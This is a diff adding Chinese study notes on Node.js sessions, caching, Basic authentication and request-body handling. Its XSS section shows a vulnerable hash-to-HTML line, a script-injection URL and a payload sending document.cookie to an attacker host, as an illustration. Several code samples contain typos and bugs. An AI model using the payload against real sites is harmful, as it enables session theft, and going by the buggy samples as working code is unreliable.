@@ -645,3 +645,156 @@ Cookie的性能问题：cookie在发送每次请求都会被带到服务端，�
 - 减小cookie大小
 - 为静态资源使用不同的域名
 - 减少DNS查询？
+
+#### 8.1.5 Session
+通过Cookie，浏览器和服务器可以实现状态的记录，但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篡改和伪造。如果服务端有部分逻辑是根据Cookie中的isVIP字段进行判断，name一个普通用户通过修改Cookie就可以轻松享受到VIP服务了，综上所述，Cookie对于敏感数据的保护是无效的。
+
+为了解决Cookie敏感数据的问题，Session应运而生。Session的数据值保留在服务器端，客户端你无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。
+
+虽然在服务端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。
+
+1. 基于Cookie来实现用户和数据的映射
+将口令妨碍Cookie里面，口令如何产生？一般服务器端会约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重读的值，并设置超时时间。以下为生成session的代码：
+```js
+var sessions = {}
+var key = 'session_id'
+var EXPRIES = 20*60*1000
+
+var generate = function() {
+  var session = {}
+  session.id = (new Date()).getTime() + Math.random()
+  session.cookie = {
+    expire: (new Date()).getTime() + EXPIRES
+  }
+  sessions[session.id] = session
+  return session
+}
+```
+
+每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成，如下：
+
+```js
+function (req, res) {
+  var id = req.cookies[key];
+  if (!id) {
+    req.session = generate()
+  } else {
+    var session = sessions[id]
+    if (session) {
+      if (session.cookie.expire > Date.now()) {
+        // 更新超时时间
+        session.cookie.expire = Date.now() + EXPIRES
+        req.session = session
+      } else {
+        // 超时了，删除旧的数据，并重新生成
+        delete sessions[id]
+        req.session = generate()
+      }
+    } else {
+      // 如果session过期或者口令不对，重新生成Session
+      req.session = generate()
+    }
+  }
+  handle(req, res)
+}
+```
+
+当然仅仅重新生成Session还不足以完成整个流程，还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据，这里我们hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑，如下：
+
+```js
+var writeHead = res.writeHead
+res.writeHead = function() {
+  var cookies = req.getHeader('Set-Cookie')
+  var session = serialize(key, req.session.id)
+  cookie = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]
+  res.setHeader('Set-Header', cookies)
+  return writeHead.apply(this, arguments)
+}
+```
+
+至此，session在前后端进行对应的过程就完成了，这样的业务路基可以判断和设置session，以此来维护用户和服务器端的关系，如下所示：
+
+```js
+var handle = function(req, res) {
+  if(!req.session.isVisit) {
+    res.session.isVisit = true
+    res.writeHead(200)
+    res.end('欢迎第一次来到动物园')
+  } else {
+    res.writeHead(200)
+    res.end('动物园再次欢迎你！')
+  }
+}
+```
+
+2. 第二种：通过查询字符串来实现浏览器端和服务器端数据的对应
+
+在上面的示例代码中，我们都将Session数据直接存在了变量sessions中，它位于内存中，然而在第五章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会因此垃圾回收的频繁扫描，引起性能问题。  
+另一个问题则是我们可能为了利用多核CPU而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会有引起错乱。  
+为了解决性能问题和Session数据无法跨进程共享的问题，常见的方案是将session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中，目前常用的工具是Redis、Memcached等。通过这些高效地缓存，Node进程无需在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些告诉缓存设计的缓存过期策略更合理高效，比在Node中自行设计缓存策略更好。  
+尽管采用专门的缓存服务回避直接在内存中访问慢，但其影响小之又小，带来的好处远远大于直接在Node中存储数据。
+
+Session安全：通过私钥加密进行签名
+
+##### 安全问题
+XSS漏洞  
+全称Cross-Site Scripting 跨站脚本攻击。XSS漏洞会让背的脚本执行，它的形成原因多数是用户的输入没有被转义，而被直接执行，比如某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示
+```js
+$('#box').html(location.hash.replace('#', ''))
+```
+攻击者在发现这里的漏洞之后，构造成了这样的URL
+```js
+http://a.com/pathname#<script src="http://b.com/c.js"></script>
+```
+为了不让受害者发现这端URL中的猫腻，它可能会通过URL压缩成一个短网址，如下
+```js
+http://t.cn/fasdfj
+// 或者再次压缩
+http://url.cn/fasdfb
+```
+然后将最终的短网址发给某个登录的在线用户，这样一来。这端hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下：
+```js
+location.href = 'http://c.com/?' + document.cookie
+```
+这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令，然后他在客户端那种用这个口令伪造Cookie，从而实现了伪装用户的身份，如果该用户是网站管理员，就可能造成极大的危害
+
+#### 8.1.6 缓存
+通常来说，POST, DELETE, PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存值应用在GET请求中。一般可以通过添加`Expires Cache-Control Etags`来实现缓存
+| 服务端 | 客户端 |
+| ---    |  ---  |
+| Last-Modefied | If-Modefied-Since |
+| Etag | If-None-Match |
+
+#### 8.1.7 Basic认证
+Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式，这里简要介绍它的原理和它在服务端通过Node处理的流程。  
+如果一个页面需要Basic认证，它会检查请求报文中的Authrization字段的内容，该字段的值由认证方式和加密值构成...   
+不过Basic认证有很多缺点。
+
+### 8.2 数据上传
+上述的内容基本都集中在HTTP请求报文头中，适用于GET请求和大多数其他请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交，文件提交，JSON上传，XML上传等。 
+
+Node的http模块支队HTTP报文的头部进行了解析，然后出发request事件，如果请求中海油内容部分(如POST请求，它具有请求和内容)，内容部分需要用户自行接收和解析，通过报头的`Transfer-Encoding`或`Content-Length`即可判断请求是否带有内容。如下:
+```js
+var hasBody = function(req) {
+  return `transfer-encoding` in req.headers || 'content-lenght' in req.headers
+}
+```
+在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示:  
+```js
+function(req, res) {
+  if (hasBody(res)) {
+    var buffers = []
+    req.on('data', function(chunk) {
+      buffers.push(chunk)
+    })
+    req.on('end', function() {
+      req.rawBody = Buffer.concat(buffers).toString()
+      handle(req, res)
+    })
+  } else {
+    handle(req, res)
+  }
+}
+```
+在接收到的Buffer列表转化为一个Buffer对象后，再装换为没有乱码的字符串，暂时挂置在req.rawBody处。
+
